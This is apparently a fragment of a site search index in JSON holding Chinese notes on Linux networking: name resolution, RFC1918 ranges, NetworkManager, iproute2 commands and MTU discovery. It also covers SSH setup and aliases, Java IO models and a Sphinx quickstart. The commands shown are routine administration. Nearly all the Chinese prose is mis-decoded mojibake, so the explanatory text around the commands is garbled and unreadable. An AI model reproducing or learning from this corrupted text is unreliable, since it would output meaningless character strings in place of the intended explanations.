æ–¹å¼è¢«è°ƒç”¨ã€‚å¦‚æœä¸»æœºåé€šè¿‡æŸ¥è¯¢ /etc/resolv.conf æ–‡ä»¶é‡Œé¢å†™çš„ äº’è”ç½‘åŸŸåç³»ç»Ÿ Domain Name System (DNS) æ¥æ‰¾åˆ°ï¼Œåˆ™è¿”å›æ‰€æœ‰æœ‰æ•ˆåœ°å€å¹¶é€€å‡º /etc/hosts å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/é…ç½®æ–‡ä»¶/etc-hosts /etc/resolv.conf å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/é…ç½®æ–‡ä»¶/etc-resolv-conf å¯¹äºå…¸å‹ adhoc å±€åŸŸç½‘ç¯å¢ƒä¸‹çš„ PC å·¥ä½œç«™ï¼Œé™¤äº†åŸºæœ¬çš„ files å’Œ dns æ–¹å¼ä¹‹å¤–ï¼Œ ä¸»æœºåè¿˜èƒ½å¤Ÿé€šè¿‡ç»„æ’­ DNS mDNS, [é›¶é…ç½®ç½‘ç»œ Zeroconf è¿›è¡Œè§£æ Avahi <https://zh.wikipedia.org/wiki/Avahi_(software)>_ æä¾› Debian ä¸‹çš„ç»„æ’­ DNS å‘ç°æ¡†æ¶ã€‚ å®ƒå’Œ Apple Bonjour / Apple Rendezvous ç›¸å½“. libnss-mdns æ’ä»¶åŒ…æä¾› mDNS çš„ä¸»æœºåè§£æï¼ŒGNU C åº“ (glibc)çš„ GNU åå­—æœåŠ¡è½¬æ¢ Name Service Switch (NSS) åŠŸèƒ½æ”¯æŒ mDNSã€‚ \" /etc/nsswitch.conf \" æ–‡ä»¶åº”å½“æœ‰åƒ \" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 \" è¿™æ ·çš„ä¸€æ®µ. \".local\" ç»“å°¾çš„ä¸»æœºåï¼Œ ä½¿ç”¨ pseudo-top-level domain (TLD) æ¥è§£æ. mDNS IPv4 æœ¬åœ°è¿æ¥ç»„æ’­åœ°å€ \" 224.0.0.251 \" æˆ–å®ƒç›¸åº”çš„ IPv6 åœ°å€ \" FF02::FB \" è¢«ç”¨æ¥ä½œä¸º \" .local \" ç»“å°¾åå­—çš„ DNS æŸ¥è¯¢ã€‚ è¾ƒè€çš„ Windows ç³»ç»Ÿå®‰è£… winbind è½¯ä»¶åŒ…æ¥æä¾›æ—§çš„ NETBios over TCP/IP ä¸»æœºåè§£æã€‚ ä¸ºå¯ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œ\" /etc/nsswitch.conf \" æ–‡ä»¶åº”å½“æœ‰è¿™æ ·çš„ä¸€æ®µï¼š \" hosts: files mdns4_minimal [NOTFOUND=return] dns mdns4 wins \"ã€‚ (ç°ä»£ Windows ç³»ç»Ÿé€šå¸¸ä½¿ç”¨ dns æ–¹å¼æ¥è¿›è¡Œä¸»æœºåè§£æã€‚) å±€åŸŸç½‘ç½‘ç»œåœ°å€èŒƒå›´ è®©æˆ‘ä»¬é‡æ–°æé†’ä¸‹åœ¨ rfc1918 é‡Œè§„å®šçš„ å±€åŸŸç½‘ local area networks (LANs) IPv4 32 ä½åœ°å€åœ¨å„ç±»åœ°å€çš„ä¿ç•™èŒƒå›´. è¿™äº›åœ°å€ä¿è¯ä¸ä¼šä¸å› ç‰¹ç½‘ä¸Šä¸“æœ‰çš„åœ°å€å†²çªã€‚ æ³¨è§£ IP åœ°å€ä¹¦å†™ä¸­æœ‰å†’å·çš„æ˜¯ IPv6 åœ°å€ ï¼Œ ä¾‹å¦‚ï¼Œ\" ::1 \" æ˜¯ localhost æœ¬åœ°ä¸»æœº ç½‘ç»œåœ°å€èŒƒå›´åˆ—è¡¨: ç±»åˆ« ç½‘ç»œåœ°å€ å­ç½‘æ©ç  å­ç½‘æ©ç /ä½æ•° å­ç½‘æ•° A 10.x.x.x 255.0.0.0 /8 1 B 172.16.x.x â€” 172.31.x.x 255.255.0.0 /16 16 C 192.168.0.x â€” 192.168.255.x 255.255.255.0 /24 256 æ³¨è§£ å¦‚æœè¿™äº›åœ°å€åˆ†é…åˆ°ä¸€ä¸ªä¸»æœºï¼Œé‚£ä¹ˆè¿™ä¸ªä¸»æœºä¸€å®šä¸èƒ½å¤Ÿç›´æ¥è®¿é—®äº’è”ç½‘ï¼Œ å¿…é¡»é€šè¿‡ä¸€ä¸ªä½œä¸ºç½‘å…³çš„ä»£ç†æœåŠ¡æˆ–é€šè¿‡ ç½‘ç»œåœ°å€è½¬æ¢ Network Address Translation (NAT) . æ¶ˆè´¹å±€åŸŸç½‘ç¯å¢ƒï¼Œå®½å¸¦è·¯ç”±å™¨é€šå¸¸ä½¿ç”¨ NATã€‚ å›¾å½¢ç•Œé¢çš„ç½‘ç»œé…ç½®å·¥å…· Debian ç³»ç»Ÿ NM çš„å®˜æ–¹æ–‡æ¡£ä½äº \" /usr/share/doc/network-manager/README.Debian \" ã€‚ æœ¬è´¨ä¸Šï¼Œå¦‚ä¸‹æ“ä½œå³å¯å®Œæˆæ¡Œé¢çš„ç½‘ç»œé…ç½®ã€‚ é€šè¿‡ä¸‹åˆ—å‘½ä»¤ä½¿æ¡Œé¢ç”¨æˆ· foo å½’å± \" netdev \" ç»„ ï¼ˆå¦å¤–ï¼Œä¾‹å¦‚ GNOME å’Œ KDE è¿™æ ·çš„ç°ä»£æ¡Œé¢ç¯å¢ƒä¼šé€šè¿‡ [D-bus < https://zh.wikipedia.org/wiki/D-Bus ) è‡ªåŠ¨å®Œæˆè¯¥æ“ä½œï¼‰: $ sudo adduser foo netdev ä½¿ \" /etc/network/interfaces \" çš„ é…ç½®ä¿æŒä¸‹é¢é‚£æ ·ç®€æ´: auto lo iface lo inet loopback é€šè¿‡ä¸‹åˆ— å‘½ä»¤é‡æ–°å¯åŠ¨ NM: $ sudo systemctl restart network-manager é€šè¿‡å›¾å½¢ç•Œé¢é…ç½®ç½‘ç»œ æ³¨æ„, åªæœ‰ ä¸ åˆ—åœ¨ \" /etc/network/interfaces \" ä¸­çš„æ¥å£ä¼šè¢« NM ç®¡ç†ï¼Œä»¥é¿å…ä¸ ifupdown çš„å†²çªã€‚ æç¤º å¦‚æœä½ æƒ³æ‰©å±• NM çš„ç½‘ç»œé…ç½®åŠŸèƒ½ï¼Œè¯·å¯»æ‰¾é€‚å½“çš„æ’ä»¶æ¨¡å—å’Œè¡¥å……è½¯ä»¶åŒ…ï¼Œ ä¾‹å¦‚ network-manager-openconnect ã€ network-manager-openvpn-gnome ã€ network-manager-pptp-gnome ã€ mobile-broadband-provider-info ã€ gnome-bluetooth ç­‰ç­‰ã€‚ åº•å±‚ç½‘ç»œé…ç½® åœ¨ Linux ä¸Šçš„åº•å±‚ç½‘ç»œé…ç½®ï¼Œä½¿ç”¨ iproute2 ç¨‹åº ( ip (8), â€¦) . Iproute2 å‘½ä»¤ Iproute2 å‘½ä»¤é›†æä¾›å®Œæ•´çš„åº•å±‚ç½‘ç»œé…ç½®èƒ½åŠ›ã€‚ æœ‰ä¸ªä»æ—§çš„ net-tools å‘½ä»¤é›†åˆ°æ–°çš„ iproute2 å‘½ä»¤é›†çš„è½¬æ¢è¡¨ ä»æ—§çš„ net-tools å‘½ä»¤é›†åˆ°æ–°çš„ iproute2 å‘½ä»¤é›†è½¬æ¢è¡¨: æ—§çš„ net-tools æ–°çš„ iproute2 æ“ä½œ ifconfig(8) ip addr ä¸€ä¸ªè®¾å¤‡ä¸Šçš„åè®®ï¼ˆIP æˆ– IPv6ï¼‰åœ°å€ route(8) ip route è·¯ç”±è¡¨æ¡ç›® arp(8) ip neigh ARP æˆ– NDISC ç¼“å­˜æ¡ç›® ipmaddr ip maddr å¤šæ’­åœ°å€ iptunnel ip tunnel IP éš§é“ nameif(8) ifrename(8) åŸºäº MAC åœ°å€çš„ç½‘ç»œæ¥å£å mii-tool(8) ethtool(8) ä»¥å¤ªç½‘è®¾å¤‡è®¾ç½® å®‰å…¨çš„åº•å±‚ç½‘ç»œæ“ä½œ ä½ å¯ä»¥æŒ‰ä¸‹é¢çš„æ–¹å¼å®‰å…¨çš„ä½¿ç”¨åº•å±‚ç½‘ç»œå‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¸ä¼šæ”¹å˜ç½‘ç»œé…ç½®: å‘½ä»¤ è¯´æ˜ ip addr show æ˜¾ç¤ºæ´»åŠ¨çš„ç½‘ç»œæ¥å£è¿æ¥å’Œåœ°å€çŠ¶æ€ route -n ç”¨æ•°å­—åœ°å€æ˜¾ç¤ºå…¨éƒ¨è·¯ç”±è¡¨ ip route show ç”¨æ•°å­—åœ°å€æ˜¾ç¤ºå…¨éƒ¨è·¯ç”±è¡¨ arp æ˜¾ç¤ºå½“å‰ ARP ç¼“å­˜è¡¨çš„å†…å®¹ ip neigh æ˜¾ç¤ºå½“å‰ ARP ç¼“å­˜è¡¨çš„å†…å®¹ plog æ˜¾ç¤º ppp åå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰æ—¥å¿— ping yahoo.com æ£€æŸ¥åˆ° \"yahoo.com\" çš„å› ç‰¹ç½‘è¿æ¥ whois yahoo.com åœ¨åŸŸåæ•°æ®åº“é‡Œé¢æ£€æŸ¥è°æ³¨å†Œäº† \"yahoo.com\" traceroute yahoo.com è·Ÿè¸ªåˆ° \"yahoo.com\" çš„å› ç‰¹ç½‘è¿æ¥ tracepath yahoo.com è·Ÿè¸ªåˆ° \"yahoo.com\" çš„å› ç‰¹ç½‘è¿æ¥ mtr yahoo.com è·Ÿè¸ªåˆ° \"yahoo.com\" çš„å› ç‰¹ç½‘è¿æ¥ï¼ˆé‡å¤çš„ï¼‰ dig æŸ¥è¯¢ç”± \"dns-server.com\" æä¾›æœåŠ¡çš„ \"example.com\" åŸŸåçš„ DNS è®°å½•ï¼š \"a\", \"mx\" æˆ– \"any\" è®°å½• dig[@dns-server.com] example.com [{a|mx|any}] iptables -L -n æŸ¥çœ‹åŒ…è¿‡æ»¤ netstat -a æ‰¾å‡ºæ‰€æœ‰æ‰“å¼€çš„ç«¯å£ netstat -l --inet æ‰¾å‡ºç›‘å¬ç«¯å£ netstat -ln --tcp æ‰¾å‡º TCP ç›‘å¬ç«¯å£ï¼ˆæ•°å­—çš„ï¼‰ dlint example.com æŸ¥è¯¢ \"example.com\" çš„ DNS zone ä¿¡æ¯ æ‰¾å‡ºæœ€ä½³ MTU æœ€å¤§ä¼ è¾“å•å…ƒ Maximum Transmission Unit (MTU) çš„å€¼èƒ½å¤Ÿé€šè¿‡åŠ  \" -M do \" é€‰é¡¹çš„ ping (8) å®éªŒæ¥ç¡®å®šï¼Œ å®ƒå‘é€ä» 1500 å­—èŠ‚ï¼ˆå¯¹äºIP+ICMP åŒ…å¤´ï¼Œæœ‰ 28 å­—èŠ‚çš„åç§»ï¼‰å¤§å°å¼€å§‹çš„ ICMP åŒ…ï¼Œæ¥æ‰¾å‡º IP ä¸åˆ†ç‰‡çš„æœ€å¤§åŒ…å¤§å°ã€‚ å°è¯•ä¸‹åˆ—ä¾‹å­: $ ping -c 1 -s $((1500-28)) -M do www.debian.org PING www.debian.org (194.109.137.218) 1472(1500) bytes of data. From 192.168.11.2 icmp_seq=1 Frag needed and DF set (mtu = 1454) --- www.debian.org ping statistics --- 0 packets transmitted, 0 received, +1 errors å°è¯• MTU=1454 ä»£æ›¿ MTU=1500 ä½ çœ‹åˆ°ç”¨ MTU=1454 ping (8) æˆåŠŸäº†ã€‚ å¦‚æœ MTU ä¸æ˜¯ 1500ï¼Œä½ å¯èƒ½æƒ³åœ¨ NM é‡Œé¢é…ç½® MTU è®¾ç½®ã€‚ è¿™ä¸ªè¿‡ç¨‹æ˜¯ è·¯å¾„ MTU (PMTU) å‘ç° , [RFC1191 , tracepath (8) å‘½ä»¤èƒ½å¤Ÿè‡ªåŠ¨å®Œæˆè¿™ä¸ªã€‚ æ³¨è§£ ä¸Šé¢çš„åˆ—å­ï¼ŒPMTU çš„å€¼æ˜¯ 1454ï¼Œè¿™æ˜¯æˆ‘å…ˆå‰çš„å…‰çº¤åˆ°æˆ·æä¾›å•†ï¼Œ ä½¿ç”¨äº† å¼‚æ­¥ä¼ è¾“æ¨¡å¼ Asynchronous Transfer Mode (ATM) ä½œä¸ºä»–ä»¬çš„éª¨å¹²ç½‘ç»œï¼Œå¹¶ä½¿ç”¨ PPPoE ä½œä¸ºå®¢æˆ·ç«¯ã€‚å®é™… PMTU å€¼ä¾èµ–äºä½ çš„ç¯å¢ƒï¼Œæ¯”å¦‚è¯´ï¼Œæˆ‘æ–°çš„å…‰çº¤åˆ°æˆ·æä¾›å•†æ˜¯ 1500ã€‚ ç½‘ç»œåº”ç”¨ æµè§ˆå™¨é…ç½® åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹åˆ—ç‰¹æ®Šçš„ URL æ¥ç¡®è®¤å®ƒä»¬çš„è®¾ç½®ã€‚ \" about: \" \" about:config \" \" about:plugins \" SSH å›½é™…åŒ–å’Œæœ¬åœ°åŒ– ç³»ç»ŸæŠ€å·§-ä»»åŠ¡å®‰æ’ ../é—®é¢˜/å•æ¬¡ä»»åŠ¡ ../é—®é¢˜/å®šæ—¶ä»»åŠ¡ ../é—®é¢˜/è°åœ¨ç³»ç»Ÿ ../é—®é¢˜/è­¦å‘Šæ‰€æœ‰äºº ../æ•™ç¨‹/ç¡¬ç›˜åˆ†åŒºé…ç½® ../é—®é¢˜/äºŒè¿›åˆ¶æ•°æ®è®¿é—®","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-Certification-and-access-control.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Certification-and-access-control.html"},{"title":"crontabæœåŠ¡","text":"è§ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/crond","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-Crontab-service.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-Crontab-service.html"},{"title":"SSHé…ç½®","text":"æœåŠ¡å™¨è¿œç¨‹è®¿é—®å’Œå·¥å…· (SSH, Secure Shell) Secure SHell (SSH) æ˜¯å› ç‰¹ç½‘ä¸Šçš„ å®‰å…¨ è¿æ¥æ–¹å¼ã€‚ åœ¨ Debian é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªå« OpenSSH çš„å…è´¹ SSH ç‰ˆæœ¬ï¼Œåœ¨ openssh-client å’Œ openssh-server åŒ…é‡Œã€‚ å¯¹äºç”¨æˆ·æ¥è®², ssh åŠŸèƒ½æ¯” telnet æ›´åŠ æ™ºèƒ½å’Œå®‰å…¨. ä¸åƒ telnet å‘½ä»¤, ssh å‘½ä»¤ä¸ä¼šåœ¨é‡åˆ° telnet çš„é€€å‡ºå­—ç¬¦(åˆå§‹é»˜è®¤æ˜¯ CTRL-])æ—¶åœæ­¢. SSH åŸºç¡€ OpenSSH SSH åå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰åªæ”¯æŒ SSH 2åè®®ã€‚ è­¦å‘Š å¦‚æœæƒ³è¦è¿è¡Œ OpenSSH æœåŠ¡ï¼Œ /etc/ssh/sshd_not_to_be_run å¿…é¡»ä¸å­˜åœ¨ã€‚ ä¸è¦æ‰“å¼€åŸºäº rhost çš„è®¤è¯( /etc/ssh/sshd_config ä¸­çš„ HostbasedAuthentication )ã€‚ å¤„ç†å…¶å®ƒ SSH å®¢æˆ·ç«¯ å…¶å®ƒå¹³å°ä¸Šæœ‰ä¸€äº›å…è´¹çš„ SSH å®¢æˆ·ç«¯ã€‚ å…¶å®ƒå¹³å°ä¸Šå…è´¹ SSH å®¢æˆ·ç«¯åˆ—è¡¨: ç¯å¢ƒ å…è´¹ SSH ç¨‹åº Windows puTTY (http://www.chiark.greenend.org.uk/~sgtatham/putty/) (GPL) Windows (cygwin) cygwin é‡Œçš„ SSH (http://www.cygwin.com/) (GPL) Macintosh ç±» macSSH (http://www.macssh.com/) (GPL) Mac OS X OpenSSH;åœ¨ç»ˆç«¯åº”ç”¨ä¸­ä½¿ç”¨ ssh (GPL) å»ºç«‹ ssh ä»£ç† ç”¨å¯†ç æ¥ä¿æŠ¤ä½ çš„ SSH è®¤è¯ç§é’¥æ˜¯å®‰å…¨çš„ã€‚ å¦‚æœå¯†ç æ²¡æœ‰è®¾ç½®ï¼Œä½¿ç”¨ ssh-keygen -p æ¥è®¾ç½®ã€‚ æŠŠä½ çš„å…¬é’¥ (æ¯”å¦‚ï¼š ~/.ssh/id_rsa.pub ) æ”¾åˆ°è¿œç¨‹ä¸»æœºçš„ ~/.ssh/authorized_keys ï¼Œè¿™ä¸ªè¿œç¨‹ä¸»æœºä½¿ç”¨ä¸Šé¢æè¿°çš„åŸºäºå¯†ç çš„è¿æ¥æ–¹å¼: $ ssh-agent bash $ ssh-add ~/.ssh/id_rsa Enter passphrase for /home/*username*/.ssh/id_rsa: Identity added: /home/*username*/.ssh/id_rsa (/home/*username*/.ssh/id_rsa) ä»è¿™é‡Œæ‰§è¡Œæ¥ä¸‹æ¥çš„å‘½ä»¤ï¼Œå°±ä¸å†éœ€è¦å¯†ç : $ scp foo username@remote.host:foo æŒ‰ &#94;D æ¥ç»ˆç»“ ssh ä»£ç†ä¼šè¯ã€‚ å¯¹äº X æœåŠ¡ç«¯ï¼Œ é€šå¸¸çš„ Debian å¯åŠ¨è„šæœ¬ä¼šä½œä¸ºçˆ¶è¿›ç¨‹æ‰§è¡Œ ssh-agent ã€‚ æ‰€ä»¥ä½ åªéœ€è¦æ‰§è¡Œä¸€æ¬¡ ssh-add ã€‚è¿›ä¸€æ­¥çš„ä¿¡æ¯ï¼Œè¯·é˜…è¯» ssh-agent å’Œ ssh-add . æ€æ ·é€šè¿‡ SSH å…³é—­è¿œç¨‹ç³»ç»Ÿ ä½ å¯ä»¥ä½¿ç”¨ at å‘½ä»¤ (å‚è§ ç¬¬ 9.4.13 èŠ‚ \"å•æ¬¡ä»»åŠ¡æ—¶é—´å®‰æ’\" ) æ¥ä» SSH ç»ˆç«¯é‡Œä¿æŠ¤ shutdown -h now (å‚è§ ç¬¬ 1.1.8 èŠ‚ \"æ€æ ·å…³é—­ç³»ç»Ÿ\" æ“ä½œè¿‡ç¨‹: ### echo \"shutdown -h now\" | at now SSH æ•…éšœæ’æŸ¥ å¦‚æœä½ é‡åˆ°é—®é¢˜ï¼Œæ£€æŸ¥é…ç½®æ–‡ä»¶çš„æƒé™å¹¶ç”¨ -v é€‰é¡¹è¿è¡Œ ssh å¦‚æœä½ æ˜¯ root è´¦æˆ·ï¼Œå¹¶æœ‰ä½¿ç”¨é˜²ç«å¢™ï¼Œä½¿ç”¨ -p é€‰é¡¹; è¿™å¯ä»¥é¿å…ä½¿ç”¨1 â€” 1023 ä¹‹é—´çš„æœåŠ¡ç«¯å£. å¦‚æœ ssh è¿æ¥åˆ°è¿œç¨‹ç«™ç‚¹çªç„¶åœæ­¢å·¥ä½œï¼Œè¿™ä¹Ÿè®¸æ˜¯ç³»ç»Ÿç®¡ç†å‘˜èƒ¡ä¹±æ“ä½œçš„ç»“æœï¼Œ å¯èƒ½æ˜¯åœ¨ç³»ç»Ÿç»´æŠ¤æ—¶æ”¹å˜äº† host_key . åœ¨ç¡®è®¤è¿™ä¸ªæƒ…å†µåï¼Œå¹¶ä¸”æ²¡æœ‰äººè¯•å›¾ç”¨èªæ˜çš„é»‘å®¢æŠ€æœ¯æ¥ç¯¡æ”¹è¿œç¨‹ä¸»æœºï¼Œ ä½ å¯ä»¥åœ¨æœ¬æœº ~/.ssh/known_hosts é‡Œåˆ é™¤ host_key æ¡ç›®æ¥é‡æ–°è·å¾—è¿æ¥ è®¾ç½®ä¼šè¯è¿‡æœŸ è®¾ç½®ä¼šè¯è¿‡æœŸ: # /etc/ssh/sshd_config ServerAliveInterval 60 # å•æ¬¡å‘é€åŒ…æ£€æŸ¥é“¾æ¥æ—¶é—´ï¼Œå•ä½æ˜¯ç§’ï¼Œä¸º0è¡¨ç¤ºä¸å‘ ServerAliveCountMax 30 # æœ€å¤§æ£€æŸ¥æ¬¡æ•°ï¼Œè¶…è¿‡åæ–­å¼€é“¾æ¥ ClientAliveInterval è¿™ä¸ªå…¶å®å°±æ˜¯SSH Serverä¸Clientçš„å¿ƒè·³è¶…æ—¶æ—¶é—´ï¼Œ ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å®¢æˆ·ç«¯æ²¡æœ‰æŒ‡ä»¤è¿‡æ¥ï¼Œ Serveré—´éš”`ClientAliveInterval`çš„æ—¶é—´ï¼ˆå•ä½ç§’ï¼‰ä¼šå‘ä¸€ä¸ªç©ºåŒ…åˆ°Clientæ¥ç»´æŒå¿ƒè·³ï¼Œ 60è¡¨ç¤ºæ¯åˆ†é’Ÿå‘é€ä¸€æ¬¡ï¼Œç„¶åå®¢æˆ·ç«¯å“åº”ï¼Œè¿™æ ·å°±ä¿æŒé•¿è¿æ¥äº†ä¿è¯Sessionæœ‰æ•ˆ, é»˜è®¤æ˜¯0, ä¸å‘é€; ClientAliveCountMax å½“å¿ƒè·³åŒ…å‘é€å¤±è´¥æ—¶é‡è¯•çš„æ¬¡æ•°ï¼Œæ¯”å¦‚ç°åœ¨æˆ‘ä»¬è®¾ç½®æˆäº†30ï¼Œ å¦‚æœServerå‘Clientè¿ç»­å‘30æ¬¡å¿ƒè·³åŒ…éƒ½å¤±è´¥äº†ï¼Œå°±ä¼šæ–­å¼€è¿™ä¸ªsessionè¿æ¥ã€‚ å¦ä¸€ä¸ªåœ°æ–¹: # /etc/profile TMOUT=60 # ç©ºé—²ç­‰å¾…æ—¶é—´ï¼Œé»˜è®¤å€¼0ï¼Œè¡¨ç¤ºä¸è¶…æ—¶ sshçš„æ—¶å€™å®šä¹‰åˆ«å æ–¹æ³• 1 â€“ ä½¿ç”¨ SSH é…ç½®æ–‡ä»¶ è¿™æ˜¯æˆ‘åˆ›å»ºåˆ«åçš„é¦–é€‰æ–¹æ³•ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SSH é»˜è®¤é…ç½®æ–‡ä»¶æ¥åˆ›å»º SSH åˆ«åã€‚ä¸ºæ­¤ï¼Œ ç¼–è¾‘ ~/.ssh/config æ–‡ä»¶ï¼ˆå¦‚æœæ­¤æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåªéœ€åˆ›å»ºä¸€ä¸ªï¼‰: $ vi ~/.ssh/config æ·»åŠ æ‰€æœ‰è¿œç¨‹ä¸»æœºçš„è¯¦ç»†ä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤º: Host webserver HostName 192.168.225.22 User sk Host dns HostName server.example.com User root Host dhcp HostName 192.168.225.25 User ostechnix Port 2233 æ–¹æ³• 2 â€“ ä½¿ç”¨ Bash åˆ«å è¿™æ˜¯åˆ›å»º SSH åˆ«åçš„ä¸€ç§åº”æ€¥å˜é€šçš„æ–¹æ³•ï¼Œå¯ä»¥åŠ å¿«é€šä¿¡çš„é€Ÿåº¦ã€‚ ä½ å¯ä»¥ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/alias ä½¿è¿™é¡¹ä»»åŠ¡æ›´å®¹æ˜“ã€‚ æ‰“å¼€ ~/.bashrc æˆ–è€… ~/.bash_profile æ–‡ä»¶: alias webserver='ssh sk@server.example.com' alias dns='ssh sk@server.example.com' alias dhcp='ssh sk@server.example.com -p 2233' alias ubuntu='ssh sk@server.example.com -i ~/.ssh/id_rsa_remotesystem' å†æ¬¡ç¡®ä¿ä½ å·²ä½¿ç”¨è‡ªå·±çš„å€¼æ›¿æ¢ä¸»æœºã€ä¸»æœºåã€ç«¯å£å·å’Œ IP åœ°å€ã€‚ä¿å­˜æ–‡ä»¶å¹¶é€€å‡ºã€‚ ç„¶åï¼Œä½¿ç”¨å‘½ä»¤åº”ç”¨æ›´æ”¹: $ source ~/.bashrc æˆ–è€…: $ source ~/.bash_profile åœ¨æ­¤æ–¹æ³•ä¸­ï¼Œä½ ç”šè‡³ä¸éœ€è¦ä½¿ç”¨ ssh åˆ«å å‘½ä»¤ã€‚ç›¸åï¼Œåªéœ€ä½¿ç”¨åˆ«åï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ $ webserver $ dns $ dhcp $ ubuntu ï¼ˆæ–¹æ³•2å¤ªæ…¢äº† alias debian9=\"user@host\" ç„¶å ssh debian9 å¤ªæ…¢äº† ï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-SSH.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-SSH.html"},{"title":"IOæ¨¡å‹","text":"BIO é˜»å¡IO NIO éé˜»å¡IO Javaæœ‰æä¾›ä¸€ä¸ªSelectorçš„å¤šè·¯å¤ç”¨æœºåˆ¶ Selectorå¤šè·¯å¤ç”¨ ä¸ä¼šé˜»å¡ åœ¨Linuxä¸‹, æ˜¯åŸºäºepollå®ç° ä¼šç»´æŠ¤ä¸€ä¸ªepollæ•°ç»„, åº•å±‚è°ƒç”¨Cçš„æœ¬åœ°æ–¹æ³•è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦: epoll_create(256) å…¶ä»–ç›¸å…³å¯å‚è€ƒ /docs/åç«¯/java/IOæ¨¡å‹ Nettyçº¿ç¨‹æ¨¡å‹ åŸºäºNIOåšäº†ä¸€ç³»åˆ—å°è£…, æ€§èƒ½é«˜äº /docs/æ•°æ®åº“/redis/redis","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-IO-model.html","loc":"/yq-doc-source-docs-rear-end-java-IO-model.html"},{"title":"Sphinxç®€å•ä½¿ç”¨","text":"åˆ›å»ºSphinxé¡¹ç›® ä»¥åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ä¸ºä¾‹ yanque@yanquedembp new_doc_rst % sphinx-quickstart ./ æ¬¢è¿ä½¿ç”¨ Sphinx 5 .0.0 å¿«é€Ÿé…ç½®å·¥å…·ã€‚ è¯·è¾“å…¥æ¥ä¸‹æ¥å„é¡¹è®¾ç½®çš„å€¼ï¼ˆå¦‚æœæ–¹æ‹¬å·ä¸­æŒ‡å®šäº†é»˜è®¤å€¼, ç›´æ¥ æŒ‰å›è½¦å³å¯ä½¿ç”¨é»˜è®¤å€¼ï¼‰ã€‚ å·²é€‰æ‹©æ ¹è·¯å¾„ï¼š./ æœ‰ä¸¤ç§æ–¹å¼æ¥è®¾ç½® Sphinx è¾“å‡ºçš„åˆ›å»ºç›®å½•ï¼š ä¸€æ˜¯åœ¨æ ¹è·¯å¾„ä¸‹åˆ›å»º\"_build\"ç›®å½•, äºŒæ˜¯åœ¨æ ¹è·¯å¾„ä¸‹åˆ›å»º\"source\" å’Œ\"build\"ä¸¤ä¸ªç‹¬ç«‹çš„ç›®å½•ã€‚ > ç‹¬ç«‹çš„æºæ–‡ä»¶å’Œæ„å»ºç›®å½•ï¼ˆy/nï¼‰ [ n ] : é¡¹ç›®åç§°å°†ä¼šå‡ºç°åœ¨æ–‡æ¡£çš„è®¸å¤šåœ°æ–¹ã€‚ > é¡¹ç›®åç§°: study_doc > ä½œè€…åç§°: yanque > é¡¹ç›®å‘è¡Œç‰ˆæœ¬ [] : 0 .0.0 å¦‚æœç”¨è‹±è¯­ä»¥å¤–çš„è¯­è¨€ç¼–å†™æ–‡æ¡£, ä½ å¯ä»¥åœ¨æ­¤æŒ‰è¯­è¨€ä»£ç é€‰æ‹©è¯­ç§ã€‚ Sphinx ä¼šæŠŠå†…ç½®æ–‡æœ¬ç¿»è¯‘æˆç›¸åº”è¯­è¨€çš„ç‰ˆæœ¬ã€‚ æ”¯æŒçš„è¯­è¨€ä»£ç åˆ—è¡¨è§ï¼š http://sphinx-doc.org/config.html#confval-languageã€‚ > é¡¹ç›®è¯­ç§ [ en ] : zh_CN åˆ›å»ºæ–‡ä»¶ /Users/yanque/project/new_doc_rst/source/conf.pyã€‚ åˆ›å»ºæ–‡ä»¶ /Users/yanque/project/new_doc_rst/source/index.rstã€‚ åˆ›å»ºæ–‡ä»¶ /Users/yanque/project/new_doc_rst/Makefileã€‚ åˆ›å»ºæ–‡ä»¶ /Users/yanque/project/new_doc_rst/make.batã€‚ å®Œæˆï¼šå·²åˆ›å»ºåˆå§‹ç›®å½•ç»“æ„ã€‚ ä½ ç°åœ¨å¯ä»¥å¡«å†™ä¸»æ–‡æ¡£æ–‡ä»¶ /Users/yanque/project/new_doc_rst/source/index.rst å¹¶åˆ›å»ºå…¶ä»–æ–‡æ¡£æºæ–‡ä»¶äº†ã€‚ ç”¨ Makefile æ„å»ºæ–‡æ¡£, ä¾‹å¦‚ï¼š make builder æ­¤å¤„çš„\"builder\"æ˜¯æ”¯æŒçš„æ„å»ºå™¨å, æ¯”å¦‚ htmlã€latex æˆ– linkcheckã€‚ æ³¨è§£ æ³¨æ„ä¸è¦ä½¿ç”¨ç‹¬ç«‹çš„sourceæ–‡ä»¶å¤¹, ä¸ç„¶ä½¿ç”¨toctreeä¼šå­˜åœ¨ç›¸å¯¹è·¯å¾„çš„é—®é¢˜, æš‚æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ. ç²—ç•¥çœ‹äº†ä¸€ä¸‹æºç , makeä¸çŸ¥é“æ€ä¹ˆæ‰“æ–­ç‚¹, çœ‹èµ·æ¥æ„Ÿè§‰æ˜¯è®¾è®¡å­˜åœ¨é—®é¢˜, ä½œç½¢. é…ç½® é…ç½®æ–‡ä»¶åœ¨ config.py , é»˜è®¤çš„ä¸»é¢˜æ¯”è¾ƒä¸‘ 